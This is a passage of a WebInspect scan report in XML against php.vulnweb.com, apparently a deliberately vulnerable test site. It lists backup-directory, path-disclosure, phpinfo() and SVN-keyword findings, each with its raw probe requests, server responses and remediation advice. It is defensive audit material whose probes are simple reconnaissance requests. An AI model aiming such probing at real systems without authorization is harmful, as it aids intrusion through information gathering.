often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="ede2959c-b29f-4f0c-bc27-a482f8158385"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11455</EngineType><AttackHTTPRequest><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-3%20(copy)/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="052AF915C2E09AA040C60C7DD02CEC18";PSID="BA31779DAB14A79CD812E387710EB2DB";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="cbdcf4e2";
X-Request-Memo: ID="6a3dd245";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11485</VulnerabilityID><Severity>3</Severity><Name>Backup Directory ( (copy))</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected a backup directory with (copy) suffix on the target server. It might contain sensitive artifacts such as source code and design documents relevant to the site. Based on the directory contents, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker may use information obtained to create precise targeted attacks, which may not otherwise be feasible, against the application.  
]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker may use the information obtained from the backup directory contents to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.  

]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Prohibit storage of backup directories on webroot. Further QA can include test cases to look for the presence of backup directories in the webroot to ensure none are left in publicly accessible folders of the web application.  
]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)"> OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)  </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure  </a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="052AF915C2E09AA040C60C7DD02CEC18"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-3%20(copy)/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="052AF915C2E09AA040C60C7DD02CEC18";PSID="BA31779DAB14A79CD812E387710EB2DB";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="cbdcf4e2";
X-Request-Memo: ID="6a3dd245";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:39 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 136


Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></RawResponse><Request id="052AF915C2E09AA040C60C7DD02CEC18"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-3%20(copy)/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="052AF915C2E09AA040C60C7DD02CEC18";PSID="BA31779DAB14A79CD812E387710EB2DB";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11485";Engine="Directory+Extension+Addition";SmartMode="4";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="cbdcf4e2";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6a3dd245";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:39 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>136</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="B888903387B1533815AA6ACA2AA767E7"><URL>http://php.vulnweb.com:80/Mod_Rewrite_Shop/BuyProduct-3%20-%20Copy/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="6cd46634-aa6c-46d4-b1f1-2180f06bbe63"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>CUSTOM</EngineType><AttackHTTPRequest /><VulnerabilityID>810</VulnerabilityID><Severity>1</Severity><Name>Possible Server Path Disclosure (unix)</Name><Classifications><Classification kind="CWE" identifier="CWE-209" href="http://cwe.mitre.org/data/definitions/209.html">CWE-209: Information Exposure Through an Error Message</Classification><Classification kind="7PK" identifier="Errors" href="https://vulncat.fortify.com/">Errors</Classification><Classification kind="7PK Category" identifier="Poor Error Handling: Unhandled Exception" href="https://vulncat.fortify.com/">Poor Error Handling: Unhandled Exception</Classification></Classifications><DetectionSelection><Location offset="367" length="33" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A minor vulnerability has been discovered within your web application due to the the presence of a fully qualified path name to the root of your system. This most often occurs in context of an error being produced by the web application. Fully qualified server path names allow an attacker to know the file system structure of the web server, which is a baseline for many other types of attacks to be successful. Recommendations include adopting a consistent error handling scheme and mechanism that prevents fully qualified path names from being displayed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
To verify the issue, click the 'HTTP Response' button on the properties view and review the highlighted areas to determine the Unix path found.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />

Don't display fully qualified pathnames as part of error or informational messages.  At the least, fully qualified pathnames can provide an attacker with important information about the architecture of web application.  <br /><br /><b>For Security Operations: </b><br /><br />

The following recommendations will help to ensure that a potential attacker is not deriving valuable information from any error message that is presented. 

<ul><li><b>Uniform Error Codes:</b> Ensure that you are not inadvertently supplying information to an attacker via the use of inconsistent or "conflicting" error messages. For  
instance, don't reveal unintended information by utilizing error messages such as Access Denied, which will also let an attacker know that the file he seeks  
actually exists. Have consistent terminology for files and folders that do exist, do not exist, and which have read access denied. </li><br /><br /><li><b>Informational Error Messages: </b>
Ensure that error messages do not reveal too much information. Complete or partial paths, variable and file names, row and  
column names in tables, and specific database errors should never be revealed to the end user. Remember, an attacker will gather as much information as  
possible, and then add pieces of seemingly innocuous information together to craft a method of attack.</li><br /><br /><li><b>Proper Error Handling: </b>Utilize generic error pages and error handling logic to inform end users of potential problems. Do not provide system information or  
other data that could be utilized by an attacker when orchestrating an attack. </li></ul><b>For QA:</b><br /><br />

In reality, simple testing can usually determine how your web application will react to different input errors.  More expansive testing must be conducted to  
cause internal errors to gauge the reaction of the site.<br /><br />

The best course of action for QA associates to take is to ensure that the error handling scheme is consistent.  Do you receive a different type of error for a file  
that does not exist as opposed to a file that does? Are phrases like "Permission Denied" utilized which could reveal the existence of a file to an attacker? It is  
often a seemingly innocuous piece of information that provides an attacker with the means to discover something else which he can then utilize when  
conducting an attack.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection></Issue><Issue id="c1bfcb4e-d0bd-43ee-8751-e0887a9b43d2"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>11455</EngineType><AttackHTTPRequest><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-3%20-%20Copy/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B888903387B1533815AA6ACA2AA767E7";PSID="BA31779DAB14A79CD812E387710EB2DB";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="086ac724";
X-Request-Memo: ID="393e5ca3";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11486</VulnerabilityID><Severity>3</Severity><Name>Backup Directory ( - Copy)</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected Directory" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected Directory</Classification><Classification kind="CWE" identifier="CWE-552" href="https://cwe.mitre.org/data/definitions/552.html">CWE-552: Files or Directories Accessible to External Parties</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[WebInspect has detected a backup directory with -Copy suffix on the target server. It might contain sensitive artifacts such as source code and design documents relevant to the site. Based on the directory contents, the attacker can gain sensitive information about the site architecture, database and network access credential details, encryption keys, and so forth from these files. The attacker may use information obtained to create precise targeted attacks, which may not otherwise be feasible, against the application.  ]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[An attacker may use the information obtained from the backup directory contents to craft a precise targeted attack against the web application. Such attacks can include, but are not limited to, SQL injection, remote file system access to overwrite or inject malware, and database manipulation.  
]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[Browse to ~FullURL~ and inspect the content. Response should be a return with HTTP status code 200 and should not match target site’s file not found response.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[Prohibit storage of backup directories on webroot. Further QA can include test cases to look for the presence of backup directories in the webroot to ensure none are left in publicly accessible folders of the web application.  
]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<a href="https://www.owasp.org/index.php/Review_Old,_Backup_and_Unreferenced_Files_for_Sensitive_Information_(OTG-CONFIG-004)"> OWASP - Review Old, Backup and Unreferenced Files for Sensitive Information (OTG-CONFIG-004)  </a><br /><a href="https://cwe.mitre.org/data/definitions/200.html">CWE - 200 Information Exposure  </a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="B888903387B1533815AA6ACA2AA767E7"><![CDATA[GET /Mod_Rewrite_Shop/BuyProduct-3%20-%20Copy/ HTTP/1.1
Referer: http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="B888903387B1533815AA6ACA2AA767E7";PSID="BA31779DAB14A79CD812E387710EB2DB";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="086ac724";
X-Request-Memo: ID="393e5ca3";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:49:39 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 136


Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></RawResponse><Request id="B888903387B1533815AA6ACA2AA767E7"><Method>GET</Method><Path>/Mod_Rewrite_Shop/BuyProduct-3%20-%20Copy/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/Mod_Rewrite_Shop/BuyProduct-3/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="B888903387B1533815AA6ACA2AA767E7";PSID="BA31779DAB14A79CD812E387710EB2DB";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="6798a0e1-0603-4a14-83fb-ad85afa73fa8";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="11486";Engine="Directory+Extension+Addition";SmartMode="4";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="086ac724";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="393e5ca3";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/Mod_Rewrite_Shop/buy.php on line 8

				]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:49:39 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>136</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="2B1FE6958942656181E6657F67E65648"><URL>http://php.vulnweb.com:80/secured/phpinfo.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="2268c15d-df4a-4e32-89bc-00aad3e1c05a"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10026</EngineType><AttackHTTPRequest /><VulnerabilityID>2291</VulnerabilityID><Severity>1</Severity><Name>Environmental Variables Disclosure</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification><Classification kind="CWE" identifier="CWE-526" href="https://cwe.mitre.org/data/definitions/526.html">CWE-526: Information Exposure Through Environmental Variables</Classification></Classifications><DetectionSelection><Location offset="16819" length="11" /><Location offset="43986" length="11" /><Location offset="16678" length="11" /><Location offset="43827" length="11" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[System Environment variables log files contain information about the nature of your web application, and would allow an attacker to gain insightful information about the web system setup. Recommendations include removing this file from the affected system.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />A fundamental part of any successful attack is reconnaissance and information gathering. The primary danger from exploitation of this vulnerability is that an attacker will be able to utilize the information in launching a more serious attack. It is very simple to check for its existence, and a file most definitely on the short list of things for which a potential attacker would look.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />Remove this file from the system in question.  One of the most important aspects of web application security is to restrict access to important files or directories only to those individuals who actually need to access them. Ensure that the private architectural structure of your web application is not exposed to anyone who wishes to view it as even seemingly innocuous directories can provide important information to a potential attacker. 

<br /><br /><b>For QA:</b><br />Notify your Security or Network Operations team of this issue.

<br /><br /><b>For Development:</b><br /> Notify your Security or Network Operations team of this issue.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText /></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[System Environment variables log files contain information about the nature of your web application, and would allow an attacker to gain insightful information about the web system setup. Recommendations include removing this file from the affected system.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[A fundamental part of any successful attack is reconnaissance and information gathering. The primary danger from exploitation of this vulnerability is that an attacker will be able to utilize the information in launching a more serious attack.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[Basically, this is a matter of whether or not the System Environment variables log file is accessible.  It is very simple to check for its existence, and a file most definitely on the “short list” of things for which a potential attacker would look.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Low]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed at a convenient time.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Remove this file from the system in question.  One of the most important aspects of web application security is to restrict access to important files or directories only to those individuals who actually need to access them. Ensure that the private architectural structure of your web application is not exposed to anyone who wishes to view it as even seemingly innocuous directories can provide important information to a potential attacker. 
<br /><br />
The following recommendations can help to ensure that you are not unintentionally allowing access to either information that could be utilized in conducting an attack or propriety data stored in publicly accessible directories. 
<ul><li>Restrict access to important files or directories only to those who actually need it. </li><li>Ensure that files containing sensitive information are not left publicly accessible or that comments left inside files do not reveal the locations of directories best left confidential.</li><li>Turn off the Automatic Directory Listing feature in your application server package. </li><li>Don't follow standard naming procedures for hidden directories. For example, don't create a hidden directory called "cgi" that contains cgi scripts. Obvious directory names are just that...readily guessed by an attacker. </li></ul><br /><br />
Remember, the harder you make it for an attacker to access information about your web application, the more likely it is that he will simply find an easier target.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
Remove this file from the production server. One of the most important aspects of Web application security is restricting access to important files or directories to only those individuals who actually need to access them. Ensure that the private architectural structure of your Web application is not exposed to anyone who wishes to view it. Even seemingly innocuous directories can provide important information to a potential attacker. <br /><br />
The following recommendations can help ensure that you are not unintentionally allowing access to information that could be used in conducting an attack or to proprietary data stored in publicly accessible directories.
<ul><li>Restrict access to important files or directories to only those who actually need it. </li><li>Ensure that files containing sensitive information are not left publicly accessible and that comments left inside files do not reveal the locations of directories that are best left confidential. </li><li>Turn off the Automatic Directory Listing feature in your application server package. </li><li>Don't follow standard naming conventions for hidden directories. For example, don't create a hidden directory called "cgi" that contains cgi scripts. Obvious directory names are just that: readily guessed by an attacker. </li></ul>
Remember, the harder you make it for an attacker to access information about your Web application, the more likely it is that he will simply find an easier target.]]></SectionText></ReportSection></Issue><Issue id="59b69a3b-f3ae-425c-a2ba-4b32e73e6190"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/secured/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2B1FE6958942656181E6657F67E65648";PSID="990B9CEB1864EF8E567D50B3C27D5823";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10478";Engine="Request+Modify";SmartMode="4";tid="58";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="bc46c19d";
X-Request-Memo: ID="0988f1fe";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10479</VulnerabilityID><Severity>2</Severity><Name>Phpinfo() Information Disclosure</Name><Classifications><Classification kind="CWE" identifier="CWE-497" href="http://cwe.mitre.org/data/definitions/497.html">CWE-497: Exposure of System Data to an Unauthorized Control Sphere</Classification><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="System Information Leak: External" href="https://vulncat.fortify.com/">System Information Leak: External</Classification></Classifications><DetectionSelection><Location offset="1402" length="16" /><Location offset="1602" length="5" /><Location offset="4315" length="5" /><Location offset="4622" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[The output from the PHP function phpinfo() has been detected.  The phpinfo() function is used to display various server environment and configuration information, resulting in an information disclosure vulnerability.  Recommendations include removing the offending PHP page, modifying the page to disable the call to phpinfo(), or restricting access to the page.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
The disclosed server configuration information can aid an attacker in attacking the server and application.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Click <a href="~FullURL~">~FullURL~</a> to verify the vulnerability in a web browser.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Security Operations:</b><br />
Evaluate the production requirements for this application script.  If it is not required for production operation, then the script should be removed or restricted by a server access control mechanism.  More information about implementing access control schemes can be found in the References.

<br /><br /><b>For Development:</b><br />
Do not use the phpinfo() function with production code.

<br /><br /><b>For QA:</b><br />
Do not allow the output of the phpinfo() function to be visible in the production application.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn2.microsoft.com/en-us/library/aa292114.aspx">IIS Authentication</a><br /><a href="http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/9b619620-4f88-488b-8243-e6bc7caf61ad.mspx?mfr=true">Authentication in IIS 6.0 (IIS 6.0)</a><br /><a href="http://support.microsoft.com/kb/324274">How to configure IIS Web site authentication in Windows Server 2003</a><br /><br /><b>Apache:</b><br /><a href="  http://httpd.apache.org/docs/1.3/howto/auth.html">Apache HTTP Server Version 1.3 - Authentication, Authorization, and Access Control</a><br /><a href="http://httpd.apache.org/docs/2.0/howto/auth.html">Apache HTTP Server Version 2.0 - Authentication, Authorization, and Access Control</a>]]></SectionText></ReportSection></Issue><Issue id="a4051659-ceee-49ab-b4c8-f9dfbe13a787"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>10028</EngineType><AttackHTTPRequest><![CDATA[GET /secured/phpinfo.php HTTP/1.1
Referer: http://php.vulnweb.com/secured/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="2B1FE6958942656181E6657F67E65648";PSID="990B9CEB1864EF8E567D50B3C27D5823";SessionType="AuditAttack";CrawlType="None";AttackType="Probe";OriginatingEngineID="65cee7d3-561f-40dc-b5eb-c0b8c2383fcb";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="10478";Engine="Request+Modify";SmartMode="4";tid="58";tt="11";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="bc46c19d";
X-Request-Memo: ID="0988f1fe";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>10695</VulnerabilityID><Severity>1</Severity><Name>Subversion Keyword Information Disclosure</Name><Classifications><Classification kind="CWE" identifier="CWE-497" href="http://cwe.mitre.org/data/definitions/497.html">CWE-497: Exposure of System Data to an Unauthorized Control Sphere</Classification><Classification kind="7PK" identifier="Encapsulation" href="https://vulncat.fortify.com/">Encapsulation</Classification><Classification kind="7PK Category" identifier="System Information Leak: External" href="https://vulncat.fortify.com/">System Information Leak: External</Classification></Classifications><DetectionSelection><Location offset="21661" length="55" /><Location offset="32195" length="69" /><Location offset="36757" length="58" /><Location offset="39196" length="56" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A Subversion (SVN) keyword replacement was found in the page content. This tag generally contains the SVN user name, which may also be a system user name.  Recommendations include changing how or where the SVN keyword is used so that it is not included in page content when deployed to the web server.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />User names may be disclosed.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Click <a href="~FullURL~">~FullURL~</a> to load the page, then view the page source to find the SVN revision tag.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Change the location of the SVN keyword so that it is not included in page output, or change the SVN properties to not include the keyword substitution.]]></SectionText></ReportSection><ReportSection><Name>Reference 